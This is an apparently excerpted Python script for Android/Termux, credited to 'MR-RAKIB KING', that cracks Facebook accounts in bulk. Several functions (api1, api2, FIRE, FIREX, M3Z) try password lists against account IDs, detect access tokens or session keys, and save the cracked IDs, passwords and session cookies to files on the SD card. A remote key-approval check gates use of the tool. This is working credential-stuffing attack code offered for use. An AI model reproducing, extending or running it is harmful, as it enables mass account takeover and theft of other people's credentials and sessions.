...
try:
	prox= requests.get('https://raw.githubusercontent.com/dx-rakib-king/F-44/main/LXRAKIB.txt').text
...
def morshed1():
        ...
        return ua
#-----------------------------------------------------#
vers = requests.get('https://raw.githubusercontent.com/dx-rakib-king/F-44/main/LXRAKIB.txt').text
version = str(vers)
#-------------------------------#
#os.system('xdg-open https://facebook.com/groups/1818745901915199/')
logo = (f"""
  \x1b[38;5;46m██████   █████  ██   ██ ██ ██████  
  \x1b[38;5;47m██   ██ ██   ██ ██  ██  ██ ██   ██ 
  \x1b[38;5;48m██████  ███████ █████   ██ ██████  
...
{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m AUTHOR   : MR-RAKIB KING            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;47mFACEBOOK : LX RAKIB KING            
\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}] \x1b[38;5;48mGITHUB   : DX RAKIB KING            {version}{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆""")
def linex():
        print(f'{G}⋆{GGG}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}⋆')
def clear():
	os.system('clear')
...
try:
    os.system('clear')
    xnx = requests.get('https://raw.githubusercontent.com/dx-rakib-king/F-44/main/LXRAKIB.txt').text
...
def menu():
  ...
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/dx-rakib-king/F-44/main/LXRAKIB.txt').text    
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Key%20The%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+8801603238653?text='+tks),approval()
      time.sleep(9)
      approval()
  except:
    sys.exit()
...
def menu_a():
			...
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m⍣{XX}]\x1b[38;5;46m FILE NAME : /sdcard/RAKIB.txt  etc..')
				linex()
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://www.facebook.com/dx.rakib.king.boss.lx');menu()
			elif xd in ['4','04']:os.system('xdg-open https://chat.whatsapp.com/HNvBHDP6FOPCg3BVwlpvrC/');menu()
			elif xd in ['5','05']:os.system('xdg-open https://facebook.com/groups/1818745901915199/');menu()
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bRAKIB}[{G}RAKIB-M2{bRAKIB}]-[{G}%s{bRAKIB}]-[{G}OK:%s{bRAKIB}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bRAKIB}[{G}RAKIB-OK{bRAKIB}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/RAKIB-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[RAKIB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[RAKIB-CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bRAKIB}[{G}RAKIB-M1{bRAKIB}]-[{G}%s{bRAKIB}]-[{G}OK:%s{bRAKIB}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAKIB-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAKIB}[{G}RAKIB-OK{bRAKIB}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bRAKIB}[{G}•{bRAKIB}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAKIB-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAKIB-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAKIB}[{G}•{bRAKIB}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAKIB-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mRAKIB-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bRAKIB}[{G}•{bRAKIB}]{G} '+kuki+'')
                linex()
                open('/sdcard/RAKIB-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
